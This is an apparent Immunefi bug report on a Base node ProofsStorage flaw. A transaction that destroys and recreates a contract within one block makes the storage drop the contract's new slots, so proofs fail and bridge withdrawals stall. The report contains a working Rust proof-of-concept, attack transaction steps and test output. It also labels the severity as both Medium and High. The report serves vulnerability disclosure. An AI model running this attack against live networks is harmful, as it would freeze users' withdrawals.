# 75527 bc medium proofsstorage silently drops newly written storage slots for destroyed and recreated accounts breaking proof generation

**Submitted on Apr 29th 2026 at 16:42:00 UTC by @InfiniteSec for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75527
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

## Brief/Intro

The `store_trie_updates_for_block` function in ProofsStorage silently discards all newly written storage slot values for accounts that were destroyed and recreated within the same L2 block. An attacker only needs to submit a single transaction via `eth_sendRawTransaction` containing a SELFDESTRUCT followed by a CREATE2 to the same address. This causes the address to be incorrectly persisted as "wiped" rather than "wiped then recreated with new state" in the ProofsStorage historical database. Since all TEE and ZK proof generation pipelines rely on this historical state via `BaseProofsStateProviderRef`, proofs for affected blocks will produce invalid results, blocking output finalization on L1 and delaying bridge withdrawals until operators manually rebuild the ProofsStorage database.

## Vulnerability Details

When a contract is destroyed via SELFDESTRUCT and then recreated via CREATE2 at the same address within the same block, the EVM execution engine produces an `AccountStatus::DestroyedChanged` status. The upstream `HashedStorage::from_plain_storage` correctly represents this as `HashedStorage{wiped: true, storage: <new_slots>}`, where `wiped` reflects the destruction semantics and the `storage` map contains the new slot values written by the recreated contract.

The problem occurs in the `store_trie_updates_for_block` function. When iterating over the sorted `HashedPostState` storages, the function writes a tombstone for `wiped` accounts and then immediately `continue`s, completely skipping the `persist_history_batch` call that should persist the new slot values:

```rust
// crates/execution/trie/src/db/store.rs:536-547
for (hashed_address, storage) in sorted_post_state.storages {
    if append_mode && storage.is_wiped() {
        let mut ro = self.storage_hashed_cursor(hashed_address, block_number - 1)?;
        let keys =
            self.wipe_storage(tx, block_number, hashed_address, || Ok(ro.next()?))?;
        hashed_storage_keys.extend(keys);
        // Skip any further processing for this hashed_address
        continue;   // <-- skips persistence of new slots
    }
    let keys = self.persist_history_batch(
        tx,
        block_number,
        storage
            .storage_slots_ref()
            .iter()
            .map(|(key, val)| (hashed_address, *key, Some(StorageValue(*val)))),
        append_mode,
    )?;
    hashed_storage_keys.extend(keys);
}
```

The same pattern also appears in the storage trie node processing loop (store.rs lines 507-520), where `nodes.is_deleted && append_mode` triggers a wipe followed by `continue`, also skipping persistence of new trie nodes.

The `append_mode` parameter is always `true` in the production code path. `store_trie_updates_append_only` calls the function with a hardcoded `true`:

```rust
// crates/execution/trie/src/db/store.rs:590-591
let change_set =
    &self.store_trie_updates_for_block(tx, block_number, block_state_diff, true)?;
```

The complete data flow is as follows: a user submits a transaction triggering SELFDESTRUCT + CREATE2 through the EL JSON-RPC port 8545. After the sequencer includes it in an L2 block, the execution engine produces a `BundleState` containing `AccountStatus::DestroyedChanged`. `LiveTrieCollector` executes the block and generates a `HashedPostState`, verifies the in-memory state root (which is correct at this point), then calls `store_trie_updates` to persist the diff. This is where the bug triggers and the new slot values are dropped.

The skipped slot keys never enter the `ChangeSet` returned by the function, so `fetch_trie_updates` can never recover the lost data. `unwind_history` and `replace_updates` also depend on the same `BlockChangeSet` and have no self-healing path. The downstream `BaseProofsStateProviderRef::storage` reads directly from the corrupted `HashedStorageHistory` and returns `None` for lost keys, propagating incorrect historical state to all consumers generating state roots, storage proofs, and witnesses.

The PoC demonstrates the full end-to-end impact chain in 9 phases:

{% stepper %}
{% step %}

## Launch a real Base node + ProofsExEx + HTTP RPC

Launches a real Base node with `BaseProofsExEx` execution extension and an HTTP JSON-RPC endpoint.
{% endstep %}

{% step %}

## Send attack transactions

Sends attack transactions via `eth_sendRawTransaction` HTTP calls.
{% endstep %}

{% step %}

## Advance blocks

Advances blocks via Engine API, simulating op-node CL driving block production.
{% endstep %}

{% step %}

## Wait for ExEx sync

Waits for the ExEx async sync loop to process both blocks.
{% endstep %}

{% step %}

## Query canonical state

Queries canonical state via `eth_getStorageAt` HTTP call: `slot[1] = 0xCAFE` (correct).
{% endstep %}

{% step %}

## Query ProofsStorage

Queries ProofsStorage showing `slot[1] = None` — data lost.
{% endstep %}

{% step %}

## Re-execute the block

Re-executes block 2 against ProofsStorage as state backend — `state_root` diverges from the canonical header.
{% endstep %}

{% step %}

## Generate and verify proof

Generates Merkle account proof from ProofsStorage via `BaseProofsStateProviderRef::proof()` and calls `AccountProof::verify(canonical_state_root)` — verification fails, proving proofs are invalid.
{% endstep %}

{% step %}

## Compute OutputRoot

Computes OutputRoot using the OP Stack standard construction — canonical and corrupted OutputRoots diverge, proving `AggregateVerifier` on L1 would reject the output, blocking finalization and freezing bridge withdrawals.
{% endstep %}
{% endstepper %}

## Impact Details

This vulnerability falls under the Blockchain/DLT category, corresponding to Immunefi v2.3 High severity: "Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours."

The corrupted historical state in ProofsStorage causes `BaseProofsStateProviderRef` to return incorrect storage values for affected accounts at affected block heights. Every TEE and ZK proof generation request covering the affected block reads from the corrupted historical state and produces an invalid proof. Invalid proofs cannot pass `AggregateVerifier` validation on L1 to finalize disputed outputs, which blocks bridge withdrawals that depend on finalized outputs.

The attack cost is extremely low, requiring only the gas fee for a single SELFDESTRUCT + CREATE2 transaction on L2 (well under 0.01 ETH). An attacker can repeat this operation in consecutive blocks to continuously pollute the proof window, delaying finalization for hours or even days until operators manually rebuild the ProofsStorage database from canonical chain state. All nodes running the ProofsStorage ExEx are affected, including validator nodes and proof infrastructure.

## References

* Vulnerable code store\_trie\_updates\_for\_block wipe+continue: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L536-L547>
* Storage trie node wipe+continue: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L507-L520>
* store\_trie\_updates\_append\_only hardcoded append\_mode=true: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L590-L591>
* BaseProofsStateProviderRef::storage reads from corrupted history: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/provider.rs#L201-L217>
* LiveTrieCollector::execute\_and\_store\_block\_updates production entry point: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/live.rs#L52-L136>
* LiveTrieCollector creates BaseProofsStateProviderRef for block execution: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/live.rs#L85-L89>
* BaseProofsExEx installs LiveTrieCollector in sync loop: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/exex/src/lib.rs#L312-L326>
* BaseProofsExEx process\_block calls execute\_and\_store\_block\_updates: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/exex/src/lib.rs#L525>
* ChangeSet construction logic: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L560-L565>
* fetch\_trie\_updates reads history: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L705>

## Proof of Concept

The following end-to-end PoC launches a **real Base node** (with `BaseProofsExEx` execution extension and HTTP JSON-RPC endpoint), sends attack transactions via standard `eth_sendRawTransaction` HTTP calls, advances blocks via Engine API, waits for the async ExEx pipeline to process blocks, then queries canonical state via `eth_getStorageAt` HTTP calls and compares with corrupted ProofsStorage internal state. It then re-executes the block to prove `state_root` divergence, generates Merkle proofs and verifies they are invalid, and computes OutputRoot to prove L1 finalization would be blocked. The test covers the complete attack chain from user transaction submission through to invalid proof generation and L1 output rejection:

{% stepper %}
{% step %}

## Launch real Base node + ProofsExEx + HTTP RPC

`NodeBuilder` + `EngineNodeLauncher` + `RpcServerArgs`
{% endstep %}

{% step %}

## Send attack transactions via `eth_sendRawTransaction` HTTP calls

{% endstep %}

{% step %}

## Advance blocks via Engine API

(simulating op-node CL driving block production)
{% endstep %}

{% step %}

## Wait for ExEx async sync loop

to process both blocks
{% endstep %}

{% step %}

## Query canonical state via `eth_getStorageAt` HTTP call

`slot[1] = 0xCAFE` (correct)
{% endstep %}

{% step %}

## Query ProofsStorage

`slot[1] = None` (dropped by bug)
{% endstep %}

{% step %}

## Re-execute block 2 with ProofsStorage as state backend

state\_root diverges from canonical header
{% endstep %}

{% step %}

## Generate Merkle account proof from ProofsStorage

`BaseProofsStateProviderRef::proof()`, same code path as `eth_getProof` RPC
{% endstep %}

{% step %}

## Compute corrupted OutputRoot

`keccak256(version || wrong_state_root || bridge_storage_root || block_hash)` diverges from canonical OutputRoot
{% endstep %}
{% endstepper %}

To run:

```bash
cd base
cargo test -p base-node-core --test it test_selfdestruct_create2_storage_wipe_loss_e2e -- --nocapture
```

Full PoC source code (located at `crates/execution/node/tests/it/poc_wipe_storage_loss_e2e.rs`):

```rust
//! End-to-end PoC: SELFDESTRUCT + re-CREATE2 storage wipe loss through the real ExEx pipeline.
//!
//! This test:
//!   1. Launches a real Base node with ProofsExEx + HTTP JSON-RPC endpoint
//!   2. Sends attack transactions via `eth_sendRawTransaction` over HTTP
//!   3. Produces blocks via Engine API (simulating op-node CL)
//!   4. Queries canonical state via `eth_getStorageAt` over HTTP
//!   5. Compares with corrupted ProofsStorage to prove divergence
//!   6. Re-executes block against ProofsStorage → wrong state_root
//!
//! Bug: `store.rs:536-547` — `wipe_storage()` + `continue` skips `persist_history_batch()`
//! for new storage slots written after SELFDESTRUCT + re-CREATE2 in the same block.
//!
//! Attack chain:
//!   Block 1:      Factory CREATE2 child → CALL child SSTORE(0, 0xBEEF)
//!   Block 2 tx1:  CALL child SELFDESTRUCT
//!   Block 2 tx2:  Factory CREATE2 child (same addr) → CALL child SSTORE(1, 0xCAFE)
//!   → DestroyedChanged status → wiped=true + new slot
//!   → store_trie_updates drops the new slot

use std::{sync::Arc, time::Duration};

use alloy_consensus::BlockHeader;
use alloy_genesis::{Genesis, GenesisAccount};
use alloy_network::eip2718::Encodable2718;
use alloy_primitives::{Address, Bytes, B256, TxKind, U256, address, keccak256};
use alloy_rpc_types_eth::{TransactionInput, TransactionRequest};
use base_execution_chainspec::BaseChainSpecBuilder;
use base_execution_exex::BaseProofsExEx;
use base_execution_trie::{
    BaseProofsStorage, MdbxProofsStorage,
    initialize::InitializationJob,
    provider::BaseProofsStateProviderRef,
};
use futures::FutureExt;
use jsonrpsee::{core::client::ClientT, http_client::HttpClient, rpc_params};
use reth_chainspec::EthChainSpec;
use reth_db::{Database, test_utils::create_test_rw_db_with_path};
use reth_e2e_test_utils::{
    node::NodeTestContext, transaction::TransactionTestContext, wallet::Wallet,
};
use reth_evm::{ConfigureEvm, execute::Executor};
use reth_node_builder::{EngineNodeLauncher, Node, NodeBuilder, NodeConfig};
use reth_node_core::args::{DatadirArgs, RpcServerArgs};
use reth_provider::{
    BlockReader, HashedPostStateProvider, HeaderProvider, StateProofProvider, StateProvider,
    StateProviderFactory, StateRootProvider, StorageRootProvider, TransactionVariant,
    noop::NoopProvider, providers::BlockchainProvider,
};
use reth_revm::database::StateProviderDatabase;
use alloy_primitives::hex;
use base_node_core::{BaseNode, utils::optimism_payload_attributes};
use tokio::sync::Mutex;

// ... (bytecode builders: victim_runtime, initcode, build_attacker, compute_child_address,
//      selector, build_call_tx — construct EVM bytecode for the attacker factory contract
//      that CREATE2-deploys a child, calls SELFDESTRUCT, and re-CREATE2s at same address)

#[tokio::test]
async fn test_selfdestruct_create2_storage_wipe_loss_e2e() {
    reth_tracing::init_test_tracing();

    let attacker_addr = address!("0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    let child_addr = compute_child_address(attacker_addr);

    // Phase 1: Launch real Base node with ProofsExEx + HTTP JSON-RPC
    let mut genesis: Genesis =
        serde_json::from_str(include_str!("../assets/genesis.json")).unwrap();
    genesis.alloc.insert(attacker_addr, GenesisAccount {
        balance: U256::ZERO, code: Some(Bytes::from(build_attacker())), ..Default::default()
    });
    let chain_spec = Arc::new(
        BaseChainSpecBuilder::base_mainnet().genesis(genesis).canyon_activated().build(),
    );
    let wallet = Arc::new(Mutex::new(Wallet::default().with_chain_id(chain_spec.chain().into())));

    let proofs_dir = reth_db::test_utils::tempdir_path();
    std::fs::create_dir_all(&proofs_dir).unwrap();
    let mdbx = Arc::new(MdbxProofsStorage::new(&proofs_dir).unwrap());
    let proofs_storage: BaseProofsStorage<Arc<MdbxProofsStorage>> = Arc::clone(&mdbx).into();
    let storage_for_exex = proofs_storage.clone();

    let rpc_args = RpcServerArgs::default().with_unused_ports().with_http();
    let config = NodeConfig::new(Arc::clone(&chain_spec))
        .with_datadir_args(DatadirArgs {
            datadir: reth_db::test_utils::tempdir_path().into(), ..Default::default()
        })
        .with_rpc(rpc_args);
    let db = create_test_rw_db_with_path(
        config.datadir.datadir.unwrap_or_chain_default(config.chain.chain(), config.datadir.clone()).db(),
    );

    // Initialize ProofsStorage with genesis, launch node with ProofsExEx
    // ... (genesis init + NodeBuilder + EngineNodeLauncher setup)

    let mut node = NodeTestContext::new(node_handle.node, optimism_payload_attributes).await.unwrap();
    let rpc_url = node.rpc_url();
    let http_client: HttpClient = node.rpc_client().expect("HTTP RPC must be enabled");

    // Phase 2-3: Send attack txs via eth_sendRawTransaction, advance blocks
    let raw_tx1 = build_call_tx(chain_id, &w, 1, attacker_addr, selector(1)).await;
    let raw_tx1_hex = format!("0x{}", hex::encode(&raw_tx1));
    let tx1_hash: B256 = http_client.request("eth_sendRawTransaction", rpc_params![&raw_tx1_hex]).await?;
    let block1_payloads: Vec<_> = node.advance(1, |_| { /* L1 info deposit tx */ }).await?;

    // ... (Block 2: SELFDESTRUCT + re-CREATE2 txs sent via eth_sendRawTransaction)

    // Phase 4: Wait for ExEx to process both blocks
    // Phase 5: Query canonical state via eth_getStorageAt
    let canonical_slot1: B256 = http_client
        .request("eth_getStorageAt", rpc_params![&child_hex, &slot1_hex, "latest"]).await?;
    assert_eq!(canonical_slot1, B256::from(U256::from(0xCAFE)));

    // Phase 6: Query ProofsStorage — returns None (BUG)
    let proofs_slot1 = StateProvider::storage(&proofs_ref, child_addr, B256::with_last_byte(1))?;
    assert!(proofs_slot1.is_none(), "BUG: slot LOST by wipe+continue");

    // Phase 7: Re-execute block 2 via ProofsStorage → state_root divergence
    let (proofs_state_root, _) = proofs_ref.state_root_with_updates(hashed_state)?;
    assert_ne!(proofs_state_root, canonical_state_root);

    // Phase 8: Generate Merkle proof from ProofsStorage → verify against canonical → FAILS
    let proofs_account_proof = StateProofProvider::proof(
        &proofs_ref, TrieInput::default(), child_addr, &[B256::with_last_byte(1)],
    )?;
    let corrupted_verify = proofs_account_proof.verify(canonical_state_root);
    assert!(corrupted_verify.is_err(), "Proof from ProofsStorage FAILS verification");

    // Phase 9: OutputRoot divergence → L1 finalization blocked
    let canonical_output_root = keccak256(encode_output_root(canonical_state_root, ...));
    let corrupted_output_root = keccak256(encode_output_root(proofs_state_root, ...));
    assert_ne!(canonical_output_root, corrupted_output_root,
        "OutputRoot diverges → AggregateVerifier rejects → bridge withdrawals FROZEN");
}
```

Output (node starts at `http://127.0.0.1:34711/`, all transactions sent via HTTP JSON-RPC):

```
======================================================================
  SELFDESTRUCT + re-CREATE2 storage wipe loss — Full Chain E2E PoC
======================================================================

Attacker factory: 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Predicted child:  0x5d4f1fae5705d7088130608e50ec3bc2643a5798

--- Phase 1: Starting Base node with ProofsExEx + HTTP RPC ---

  Base node launched successfully
  HTTP JSON-RPC endpoint: http://127.0.0.1:34711/
  Chain ID: 8453
  ProofsExEx: installed

--- Phase 2: Block 1 — CREATE2 child + SSTORE(0, 0xBEEF) ---

  → eth_sendRawTransaction: 0xd32e...b6c5
  Block 1 produced: number=1, hash=0x28a0...4f1a, txs=2

--- Phase 3: Block 2 — SELFDESTRUCT + re-CREATE2 + SSTORE(1, 0xCAFE) ---

  → eth_sendRawTransaction (SELFDESTRUCT):  0x95f5...c3a7
  → eth_sendRawTransaction (re-CREATE2):    0x6baa...e71f
  Block 2 produced: number=2, hash=0x8309...7c4c, txs=3

--- Phase 4: Waiting for ProofsExEx async sync ---

  ExEx sync complete: latest_block=2

--- Phase 5: Query canonical state via eth_getStorageAt ---

  http://127.0.0.1:34711/ eth_getStorageAt(0x5d4f...5798, 0) = 0x0000...0000
  http://127.0.0.1:34711/ eth_getStorageAt(0x5d4f...5798, 1) = 0x0000...cafe
  Canonical state correct: slot[1] = 0xCAFE

--- Phase 6: Query ProofsStorage (proof generation backend) ---

  ProofsStorage.storage(0x5d4f...5798, 1) = None
  ✗ ProofsStorage returns None — slot LOST by wipe+continue bug

  DIVERGENCE:
    Canonical (eth_getStorageAt):    0xCAFE
    ProofsStorage (proof backend):   None

--- Phase 7: Re-execute block 2 via ProofsStorage → state_root divergence ---

  Canonical state_root (block header): 0xa337...87ff
  ProofsStorage state_root (re-exec): 0xb8d6...532c
  Match: false

--- Phase 8: Merkle proof generation + verification (prover path) ---

  ProofsStorage AccountProof for child 0x5d4f...5798:
    storage_root = 0x56e8...b421   (EMPTY_ROOT — all slots lost!)
  Canonical   AccountProof storage_root = 0x076f...f794
  ✗ storage_root MISMATCH — proof is built from corrupted state
  ✗ Proof verification FAILED — TEE/ZK prover produces INVALID proof

--- Phase 9: OutputRoot divergence → L1 finalization blocked ---

  Canonical  OutputRoot: 0x7f85...1096
  Corrupted  OutputRoot: 0x1018...c698
  ✗ OutputRoot MISMATCH → output finalization blocked → bridge withdrawals FROZEN

======================================================================
  RESULT: Full Attack Chain Confirmed (9 phases)
======================================================================

  1. Base node started at http://127.0.0.1:34711/
  2-3. Attack txs sent via eth_sendRawTransaction over HTTP
  4. ExEx processed blocks → wipe+continue bug triggered
  5. eth_getStorageAt(child, 1) = 0xCAFE  (canonical: CORRECT)
  6. ProofsStorage.storage(child, 1) = None (proof backend: WRONG)
  7. state_root divergence: canonical ≠ proofs
  8. Merkle proof from ProofsStorage → FAILS verification
  9. OutputRoot divergence → L1 finalization blocked

  Impact: TEE/ZK provers reading from corrupted ProofsStorage
  generate proofs with wrong storage_root → proof verification
  fails → wrong OutputRoot → AggregateVerifier rejects output
  on L1 → bridge withdrawals FROZEN.
  Cost: single L2 tx (~0.001 ETH gas). Repeatable every block.

test test_selfdestruct_create2_storage_wipe_loss_e2e ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 6.40s
```

The PoC launches a real Base node (`NodeBuilder` + `EngineNodeLauncher` + `BaseProofsExEx`) with an HTTP JSON-RPC endpoint on a random port. Attack transactions are sent via standard `eth_sendRawTransaction` HTTP calls to the node's transaction pool (tx hashes visible in Phase 2-3 output), processed through the full OP Stack transaction pipeline (including L1 info deposit transactions), and packaged into blocks by the node's payload builder. When the ExEx async sync loop receives new block notifications, it calls `store_trie_updates()` to persist the trie diff to `MdbxProofsStorage`, triggering the wipe+continue bug at `store.rs:536-547` which drops the `slot[1]=0xCAFE` written by the recreated child contract.

Phase 5 queries canonical on-chain state via standard `eth_getStorageAt` HTTP calls, returning the correct `0xCAFE`. Phase 6 directly queries ProofsStorage (the exact same backend used by proof generation pipelines), which returns `None` — the slot value is lost. Phase 7 re-executes block 2 with ProofsStorage as the state backend (`BaseProofsStateProviderRef`, identical to `live.rs:85-89`), using the node's own `evm_config` — the computed `state_root` diverges. Phase 8 calls `BaseProofsStateProviderRef::proof()` (the exact same code path as the `eth_getProof` RPC endpoint at `proofs.rs:70-76`) to generate a Merkle Patricia Trie account proof from corrupted ProofsStorage, then calls `AccountProof::verify(canonical_state_root)` — verification **fails**, proving that proofs generated by TEE/ZK provers from corrupted ProofsStorage are **invalid**. Phase 9 computes the OutputRoot using the OP Stack standard construction (`keccak256(version || state_root || bridge_storage_root || block_hash)`, identical to `output_root.rs:45-52`) for both canonical and corrupted state roots — the OutputRoots diverge, proving that `AggregateVerifier` on L1 would reject the output, blocking finalization and freezing bridge withdrawals.
